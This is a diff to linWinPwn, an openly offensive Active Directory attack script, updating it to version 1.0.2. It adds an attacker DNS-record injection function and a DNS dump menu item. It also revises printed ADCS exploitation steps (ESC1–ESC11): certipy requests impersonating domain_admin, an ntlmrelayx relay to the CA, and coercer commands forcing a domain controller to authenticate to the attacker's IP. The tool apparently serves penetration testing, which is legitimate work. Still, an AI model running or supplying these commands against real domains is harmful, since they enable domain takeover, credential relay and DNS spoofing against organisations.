@@ -111,7 +111,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.1 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.2 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -895,10 +895,6 @@ bloodyad_all_enum () {
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter (&(samAccountType=805306368)(servicePrincipalName=*)) --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt 
             echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get search --filter (&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attr sAMAccountName" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt 
-            echo -e "${CYAN}[*] Searching for DNS entries${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get dnsDump" > ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
-            echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
-            /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt 2>/dev/null | sed -n '/[^\n]*\*/,/^$/p'
        fi
     fi
     echo -e ""
@@ -909,13 +905,30 @@ bloodyad_write_enum () {
         echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
     else
         mkdir -p ${output_dir}/DomainRecon/bloodyAD
-        echo -e "${BLUE}[*] bloodyad write rights Enumeration${NC}"
         if [ "${aeskey_bool}" == true ] ; then
             echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
-            echo -e "${CYAN}[*] Searching for writable objects${NC}"
+            echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get writable" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+bloodyad_dnsquery () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/DomainRecon/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} get dnsDump" | tee ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt
+            echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
+            /bin/cat ${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt 2>/dev/null | sed -n '/[^\n]*\*/,/^$/p'
        fi
     fi
     echo -e ""
@@ -1252,13 +1265,13 @@ certipy_enum () {
                 current_dir=$(pwd)
                 cd ${output_dir}/ADCS
                 if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -stdout -old-bloodhound" 2>&1 | tee ${output_dir}/ADCS/certipy_output_${dc_domain}.txt
-                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 >> ${output_dir}/ADCS/certipy_vulnerable_output_${dc_domain}.txt
+                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -stdout -old-bloodhound" 2>&1 > ${output_dir}/ADCS/certipy_output_${dc_domain}.txt
+                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a ${output_dir}/ADCS/certipy_vulnerable_output_${dc_domain}.txt
                 cd ${current_dir}
             fi
         fi
     fi
-    adcs_vuln_parse
+    adcs_vuln_parse | tee ${output_dir}/ADCS/adcs_exploitation_steps_${dc_domain}.txt 
     echo -e ""
 }
 
@@ -1270,7 +1283,7 @@ adcs_vuln_parse (){
         for vulntemp in $esc1_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
             echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
         done
@@ -1282,9 +1295,9 @@ adcs_vuln_parse (){
         for vulntemp in $esc2_3_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template User -on-behalf-of $(echo $dc_domain | cut -d "." -f 1)\\domain_admin -pfx ${user}.pfx -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1298,7 +1311,7 @@ adcs_vuln_parse (){
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca PKI_CA -target PKI_Server -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas} > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
             echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
@@ -1312,7 +1325,7 @@ adcs_vuln_parse (){
         for vulntemp in $esc6_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template User -upn domain_admin@${dc_domain}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain}"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1326,13 +1339,13 @@ adcs_vuln_parse (){
             echo -e "${CYAN}1. Add a new officer:${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -add-officer "${user}" -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
-            echo -e "${certipy} ca ${argument_certipy} --ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
+            echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -enable-template SubCA -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca $vulntemp -issue-request <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target PKI_Server -retrieve <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulntemp -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1346,7 +1359,7 @@ adcs_vuln_parse (){
             echo -e "${CYAN}1. Start the relay server:${NC}"
             echo -e "${certipy} relay -target http://${dc_ip}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l $attacker_IP --dc-ip $dc_ip"
         done
     fi
 
@@ -1360,7 +1373,7 @@ adcs_vuln_parse (){
             echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target PKI_Server -ca PKI_CA -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas} > -template ${vulntemp} -dc-ip ${dc_ip}"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
@@ -1394,7 +1407,7 @@ adcs_vuln_parse (){
         for vulntemp in $esc11_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server (relay to the Certificate Authority and request certificate via ICPR):${NC}"
-            echo -e "ntlmrelayx.py -t rpc://PKI_Server -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
+            echo -e "ntlmrelayx.py -t rpc://< ${pki_servers} > -rpc-mode ICPR -icpr-ca-name $vulntemp -smb2support"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
         done
@@ -1415,7 +1428,7 @@ certifried_check () {
             i=0
             for pki_server in $pki_servers; do
                 i=$((i + 1))
-                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
+                pki_ca=$(echo -e $pki_cas | sed 's/ /\n/g' | sed -n ${i}p)
                 run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" 2>&1 | tee ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt
                 if [[ ! $(grep "Certificate object SID is" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null) ]] && [[ ! $(grep "error" ${output_dir}/Vulnerabilities/certifried_check_${pki_server}_${dc_domain}.txt 2>/dev/null) ]]; then
                     echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}"
@@ -2014,9 +2027,7 @@ coercer_check () {
         mkdir -p ${output_dir}/Vulnerabilities/Coercer
         echo -e "${BLUE}[*] Running scan using coercer ${NC}"
         smb_scan
-        for i in $(/bin/cat ${servers_smb_list}); do
-            run_command "${coercer} scan ${argument_coercer} -t ${i} --dc-ip $dc_ip --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.xlsx" 2>&1 | tee ${output_dir}/Vulnerabilities/Coercer/coercer_output_${i}.txt
-        done
+        run_command "${coercer} scan ${argument_coercer} -f ${servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.xlsx" | tee ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.txt
         if [[ $(grep -r "SMB  Auth" ${output_dir}/Vulnerabilities/Coercer/ 2>/dev/null) ]]; then
             echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}"
             echo -e "${CYAN}1. Run responder on second terminal to capture hashes:${NC}"
@@ -2123,6 +2134,7 @@ add_group_member () {
                 read -p ">> " target_groupmem </dev/tty
             done
             echo -e "${BLUE}[*] Please specify user to add to the group (default: current user):${NC}"
+            user_groupmem=""
             read -p ">> " user_groupmem </dev/tty
             if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
             echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
@@ -2224,7 +2236,7 @@ raise_child () {
         echo -e "${PURPLE}[-] raiseChild requires credentials${NC}"
     else
         echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
-        run_command "${impacket_rpcdump} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${domain}.txt" 2>&1 | tee -a ${output_dir}/Modification/impacket_raiseChild_output.txt
+        run_command "${impacket_rpcdump} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${dc_domain}.txt" 2>&1 | tee -a ${output_dir}/Modification/impacket_raiseChild_output.txt
     fi
     echo -e ""
 }
@@ -2255,6 +2267,28 @@ pygpo_abuse () {
         if [ ! "${command_input_gpoabuse}" == "" ] ; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
         if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi            
         run_command "$(which python) ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a ${output_dir}/Modification/pygpoabuse_output.txt
+    fi
+    echo -e ""
+}
+
+dnsentry_add () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/DomainRecon/bloodyAD
+        if [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad does not support kerberos authentication using AES Key${NC}"            
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}"
+            hostname_dnstool=""
+            read -p ">> " hostname_dnstool </dev/tty
+            if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
+            echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"        
+            set_attackerIP
+            echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a ${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt
+       fi
     fi
     echo -e ""
 }
@@ -2824,19 +2858,20 @@ ad_menu() {
     echo -e "8) Delegation Enumeration using findDelegation and netexec"
     echo -e "9) bloodyAD All Enumeration"
     echo -e "10) bloodyAD write rights Enumeration"
-    echo -e "11) SilentHound LDAP Enumeration"
-    echo -e "12) ldeep LDAP Enumeration"
-    echo -e "13) windapsearch LDAP Enumeration"
-    echo -e "14) LDAP Wordlist Harvester"
-    echo -e "15) Enumeration of RDWA servers"
-    echo -e "16) SCCM Enumeration using sccmhunter"
-    echo -e "17) LDAP Enumeration using LDAPPER"
-    echo -e "18) Adalanche Enumeration"
-    echo -e "19) GPO Enumeration using GPOwned"
-    echo -e "20) Open p0dalirius' LDAP Console"
-    echo -e "21) Open p0dalirius' LDAP Monitor"
-    echo -e "22) Open garrettfoster13's ACED console"
-    echo -e "23) Open LDAPPER custom options"
+    echo -e "11) bloodyAD query DNS server" 
+    echo -e "12) SilentHound LDAP Enumeration"
+    echo -e "13) ldeep LDAP Enumeration"
+    echo -e "14) windapsearch LDAP Enumeration"
+    echo -e "15) LDAP Wordlist Harvester"
+    echo -e "16) Enumeration of RDWA servers"
+    echo -e "17) SCCM Enumeration using sccmhunter"
+    echo -e "18) LDAP Enumeration using LDAPPER"
+    echo -e "19) Adalanche Enumeration"
+    echo -e "20) GPO Enumeration using GPOwned"
+    echo -e "21) Open p0dalirius' LDAP Console"
+    echo -e "22) Open p0dalirius' LDAP Monitor"
+    echo -e "23) Open garrettfoster13's ACED console"
+    echo -e "24) Open LDAPPER custom options"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -2888,54 +2923,58 @@ ad_menu() {
         ad_menu;;
 
         11)
-        silenthound_enum
+        bloodyad_dnsquery
         ad_menu;;
 
         12)
-        ldeep_enum
+        silenthound_enum
         ad_menu;;
 
         13)
-        windapsearch_enum
+        ldeep_enum
         ad_menu;;
 
         14)
-        ldapwordharv_enum
+        windapsearch_enum
         ad_menu;;
 
         15)
-        rdwatool_enum
+        ldapwordharv_enum
         ad_menu;;
 
         16)
-        sccm_enum
+        rdwatool_enum
         ad_menu;;
 
         17)
-        ldapper_enum
+        sccm_enum
         ad_menu;;
 
         18)
-        adalanche_enum
+        ldapper_enum
         ad_menu;;
 
         19)
-        GPOwned_enum
+        adalanche_enum
         ad_menu;;
 
         20)
-        ldap_console
+        GPOwned_enum
         ad_menu;;
 
         21)
-        ldap_monitor
+        ldap_console
         ad_menu;;
 
         22)
-        aced_console
+        ldap_monitor
         ad_menu;;
 
         23)
+        aced_console
+        ad_menu;;
+
+        24)
         ldapper_console
         ad_menu;;
 
@@ -3735,6 +3774,7 @@ modif_menu () {
     echo -e "5) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
     echo -e "6) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
     echo -e "7) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
+    echo -e "8) Add new DNS entry"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3767,6 +3807,10 @@ modif_menu () {
 
         7)
         pygpo_abuse
+        modif_menu;;
+
+        8)
+        dnsentry_add
         modif_menu;;
 
         back)
@@ -4257,8 +4301,11 @@ main () {
     prepare
     print_info
     authenticate
-    run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" > /dev/null
     sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+    if [[ ${sid_domain} == "" ]]; then 
+        run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" > /dev/null
+        sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+    fi
     echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
     echo -e ""
     if [ "${interactive_bool}" == true ]; then
